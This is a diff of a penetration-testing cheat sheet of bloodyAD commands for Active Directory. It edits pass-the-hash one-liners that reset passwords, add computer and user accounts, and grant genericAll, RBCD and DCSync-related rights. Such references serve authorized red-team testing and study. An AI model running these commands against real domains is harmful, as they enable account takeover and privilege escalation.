@@ -31,13 +31,13 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p
 ## set - change user password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Jubeaz12345!>' 
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
 ```
 
 ## set cross-domain - change user password (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <target_dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Jubeaz12345!>' 
+bloodyad --host <target_dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
 ```
 
 ## set - add/replace/delete target attribute  (pth)
@@ -57,7 +57,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> set
 ## add - add computer (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Jubeaz123+->
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
 ```
 ## add - DCSync right (pth)
 https://github.com/CravateRouge/bloodyAD
@@ -73,7 +73,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add 
 ## add - full control (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Jubeaz123+-> 
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
 ```
 ## add - groupMember (pth)
 https://github.com/CravateRouge/bloodyAD
@@ -83,7 +83,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add 
 ## add - rbcd (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
 ```
 ## add - shadowCredentials (pth)
 https://github.com/CravateRouge/bloodyAD
@@ -98,7 +98,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add
 ## add - user (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
 ```
 
 ## get - list children of an object (pth)
